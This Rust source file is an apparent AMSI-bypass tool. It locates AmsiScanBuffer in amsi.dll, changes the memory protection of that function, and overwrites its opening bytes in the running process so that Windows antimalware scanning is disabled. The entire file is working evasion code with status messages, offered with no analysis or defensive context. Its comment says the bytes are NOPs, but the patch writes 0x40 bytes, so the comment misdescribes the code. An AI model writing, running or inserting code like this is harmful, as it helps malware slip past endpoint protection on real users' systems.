use std::{ffi::CString, ptr};

use winapi::{
    um::{
    memoryapi::{
        VirtualProtect,
        WriteProcessMemory
    },
    libloaderapi::{
        LoadLibraryA,
        GetProcAddress
    },
    processthreadsapi::GetCurrentProcess, 
    winnt::PAGE_READWRITE
    }, 
    shared::{
        minwindef::{
            DWORD, 
            FALSE
        },
        ntdef::NULL
    }
};

fn main() {
    println!("[+] Patching amsi for current process...");

    unsafe {
        // Getting the address of AmsiScanBuffer.
        let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
        let amsi_dll = LoadLibraryA(CString::new("amsi").unwrap().as_ptr());
        let amsi_scan_addr = GetProcAddress(amsi_dll, CString::new("AmsiScanBuffer").unwrap().as_ptr());
        let mut old_permissions: DWORD = 0;
        
        // Overwrite this address with nops.
        if VirtualProtect(amsi_scan_addr.cast(), 6, PAGE_READWRITE, &mut old_permissions) == FALSE {
            panic!("[-] Failed to change protection.");
        }
        let written: *mut usize = ptr::null_mut();

        if WriteProcessMemory(GetCurrentProcess(), amsi_scan_addr.cast(), patch.as_ptr().cast(), 6, written) == FALSE {
            panic!("[-] Failed to overwrite function.");
        }

        // Restoring the permissions.
        VirtualProtect(amsi_scan_addr.cast(), 6, old_permissions, &mut old_permissions);
        println!("[+] AmsiScanBuffer patched!");
    }
}
